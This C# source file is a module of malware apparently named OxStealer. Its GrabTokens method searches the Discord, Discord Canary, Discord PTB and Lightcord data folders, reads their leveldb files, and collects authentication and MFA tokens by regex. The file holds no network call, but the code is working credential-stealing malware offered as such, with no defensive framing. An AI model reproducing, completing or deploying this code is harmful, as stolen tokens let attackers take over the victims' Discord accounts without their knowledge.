using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace OxStealer.Modules
{
    internal static class Discord
    {
        static readonly Regex TokenRe = new Regex(
            @"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{84}",
            RegexOptions.Compiled);

        public static List<string> GrabTokens()
        {
            var tokens = new HashSet<string>();
            var app = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var dirs = new[]
            {
                Path.Combine(app, "Discord"),
                Path.Combine(app, "discordcanary"),
                Path.Combine(app, "discordptb"),
                Path.Combine(app, "Lightcord"),
            };

            foreach (var dir in dirs)
            {
                if (!Directory.Exists(dir)) continue;
                foreach (var f in Directory.GetFiles(dir, "*", SearchOption.AllDirectories))
                {
                    if (!f.Contains("leveldb")) continue;
                    try
                    {
                        var text = File.ReadAllText(f);
                        foreach (Match m in TokenRe.Matches(text)) tokens.Add(m.Value);
                    }
                    catch { }
                }
            }
            return new List<string>(tokens);
        }
    }
}